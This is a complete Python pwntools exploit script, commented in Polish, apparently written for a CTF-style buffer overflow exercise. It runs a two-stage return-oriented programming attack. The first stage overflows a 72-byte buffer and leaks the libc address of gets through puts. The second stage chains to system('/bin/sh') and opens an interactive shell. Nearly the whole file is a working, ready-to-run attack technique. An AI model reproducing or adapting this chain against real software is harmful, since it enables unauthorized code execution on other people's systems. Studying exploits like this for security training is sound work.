import sys
from pwn import *

# debuggowanie
#p = gdb.debug('./vuln-64', ''  break vuln   c''')
#context.log_level = 'DEBUG'

##########  przygotowanie  ###########
PADDING_SIZE = 72                            # buffer+padding - tyle zeby nadpisac rbp na stosie
PATH_TO_BINARY = sys.argv[1]                 # sciezka do eksploitowanego programu
elf = context.binary = ELF(PATH_TO_BINARY)
libc = elf.libc
p = process()

##############  etap 1  ##############
p.recvline()
rop = ROP(elf)
rop.raw('A'*PADDING_SIZE)
rop.raw(rop.rdi)
rop.raw(elf.got['gets'])
rop.raw(elf.plt['puts'])
rop.raw(elf.sym['main'])
p.sendline(rop.chain())

######  wyliczenie adresu libc  ######
leaked_gets = u64(p.recv(6) + b'\x00\x00')
libc.address = leaked_gets - libc.sym['gets']

##############  etap 2  ##############
rop = ROP(elf)
rop.raw('A'*PADDING_SIZE)
rop.raw(rop.rdi)
rop.raw(next(libc.search(b'/bin/sh\x00')))
rop.raw(rop.ret)
rop.raw(libc.sym['system'])
rop.raw(libc.sym['exit'])
p.sendline(rop.chain())
p.recvlines(2)


p.interactive('> ')
